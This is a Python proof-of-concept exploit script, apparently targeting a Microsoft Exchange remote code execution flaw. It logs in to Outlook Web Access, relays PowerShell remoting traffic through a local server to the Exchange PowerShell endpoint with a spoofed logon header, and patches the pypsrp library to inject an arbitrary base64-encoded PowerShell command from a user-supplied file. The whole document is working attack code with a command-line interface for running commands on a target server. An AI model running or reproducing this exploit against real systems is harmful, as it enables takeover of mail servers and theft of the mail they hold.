# from 0day.pypsrp.src.pypsrp.complex_objects import DictionaryMeta
# from pypsrp.complex_objects import ObjectMeta

import threading
import argparse
import os, base64

# os.environ['http_proxy'] = 'http://localhost:8080'
# os.environ['https_proxy'] = 'http://localhost:8080'


from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

import requests


s = requests.Session()

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    pass


class ExchangeExploitHandler(BaseHTTPRequestHandler):
    def do_POST(self):

        length = int(self.headers["content-length"])
        post_data = self.rfile.read(length).decode()

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/soap+xml;charset=UTF-8",
            "X-OWA-ExplicitLogonUser": f"owa/mastermailbox@outlook.com",
        }

        powershell_endpoint = f"https://{host}/owa/mastermailbox%40outlook.com/powershell"

        resp = s.post(
            powershell_endpoint,
            data=post_data,
            headers=headers,
            verify=False,
            allow_redirects=False,
        )
        content = resp.content
        self.send_response(200)
        self.end_headers()
        self.wfile.write(content)


def login(username, passwd):

    url = f"https://{host}/owa/auth.owa"

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    r = s.post(
        url,
        headers=headers,
        data={
            "destination": f"https://{host}/owa",
            "flags": "4",
            "forcedownlevel": "0",
            "username": username,
            "password": passwd,
            "passwordText": "",
            "isUtf8": "1",
        },
        verify=False,
    )
    if r.status_code != 200:
        print("[-] Fail when login")


def start_rpc_server():
    server = ThreadedHTTPServer(("127.0.0.1", 13337), ExchangeExploitHandler)
    server_thread = threading.Thread(target=server.serve_forever)
    server_thread.daemon = True
    server_thread.start()


def exploit(username):
    import sys

    sys.path.append("./")
    from pypsrp.powershell import PowerShell, RunspacePool
    from pypsrp.wsman import WSMan

    wsman = WSMan(
        "127.0.0.1",
        username=username,
        password="random",
        ssl=False,
        port=13337,
        auth="basic",
        encryption="never",
    )

    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        ps = PowerShell(pool)
        ps.add_cmdlet("Get-Mailbox").add_argument("-Anr").invoke()

        errors = "\n".join([str(s) for s in ps.streams.error])

        # print(errors)
        if "on parameter 'Identity'" in errors:
            print(f"[+] Successfully RCE")
        else:
            print(
                "[-] The error notice warns that RCE may not have been exploited. Check it manually."
            )

        # print("[+] Error: %s " % errors)
        return


def powershell_base64encode(cmd):
    return base64.b64encode(cmd.encode("UTF-16LE")).decode()


def modify_pypsrp(cmd):

    msg = ""
    with open("pypsrp/messages-bk.py") as f:
        msg = f.read()

    with open("pypsrp/messages.py", "w") as f:
        msg = msg.replace(
            "$$POWERSHELL_ENCODE_PAYLOAD_HERE$$", powershell_base64encode(cmd)
        )

        f.write(msg)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Microsoft Exchange RCE Poc\n Example: python3 poc.py -H https://192.168.137.143 -u user2 -p "123QWEasd!@#" -c cmd_file')
    parser.add_argument(
        "-H",
        dest="host",
        action="store",
        type=str,
        help='Host, eg. "http://127.0.0.1"',
        required=True,
    )

    parser.add_argument(
        "-u", dest="user", action="store", type=str, help="username", required=True
    )
    parser.add_argument(
        "-p", dest="passwd", action="store", type=str, help="password", required=True
    )

    parser.add_argument(
        "-c",
        dest="cmd_file",
        action="store",
        type=str,
        default="cmd",
        help='File contain command that you want to run. This command will be run as `powershell -e "base64_encode(content(cmd_file))"`'
    )

    args = parser.parse_args()
    host = args.host.strip(r"https?://")
    user = args.user
    passwd = args.passwd
    cmd_file = args.cmd_file

    print('Password:', passwd)
    cmd = ""
    with open(cmd_file) as f:
        cmd = f.read()
    login(user, passwd)

    start_rpc_server()
    modify_pypsrp(cmd)
    exploit(user)
